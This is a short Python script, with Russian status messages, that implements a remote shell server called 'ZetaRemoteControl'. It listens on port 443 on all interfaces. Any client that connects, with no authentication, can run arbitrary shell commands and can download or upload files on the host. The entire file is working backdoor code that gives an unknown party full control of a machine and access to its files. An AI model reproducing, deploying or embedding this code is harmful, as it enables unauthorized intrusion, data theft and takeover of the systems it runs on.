import socket
import subprocess
import os
import sys
import threading

class ZetaRemoteControl:
    def __init__(self, host='0.0.0.0', port=443):
        self.host = host
        self.port = port
        self.connection = None
        self.running = True
        
    def execute_command(self, command):
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
            return result.decode('cp866', errors='ignore')
        except Exception as e:
            return str(e)
    
    def receive_file(self, save_path):
        with open(save_path, 'wb') as f:
            while True:
                data = self.connection.recv(4096)
                if data.endswith(b'<END_OF_FILE>'):
                    f.write(data[:-12])
                    break
                f.write(data)
        return f"Файл сохранён как {save_path}"
    
    def send_file(self, file_path):
        if os.path.exists(file_path):
            with open(file_path, 'rb') as f:
                data = f.read()
            self.connection.sendall(data + b'<END_OF_FILE>')
            return "Файл отправлен"
        return "Файл не найден"
    
    def handle_connection(self):
        while self.running:
            try:
                self.connection.send(b'ZetaShell> ')
                command = self.connection.recv(4096).decode().strip()
                
                if command.lower() == 'exit':
                    break
                
                elif command.startswith('download '):
                    file_path = command[9:]
                    result = self.send_file(file_path)
                    self.connection.send(result.encode())
                
                elif command.startswith('upload '):
                    filename = command[7:]
                    result = self.receive_file(filename)
                    self.connection.send(result.encode())
                
                else:
                    result = self.execute_command(command)
                    self.connection.send(result.encode())
                    
            except Exception as e:
                break
    
    def start_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(1)
        
        print(f"Сервер слушает на {self.host}:{self.port}")
        
        while self.running:
            try:
                self.connection, address = server.accept()
                self.connection.send(b'Connected to Zeta Remote Shell!\n')
                self.handle_connection()
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                continue

if __name__ == "__main__":
    controller = ZetaRemoteControl()
    controller.start_server()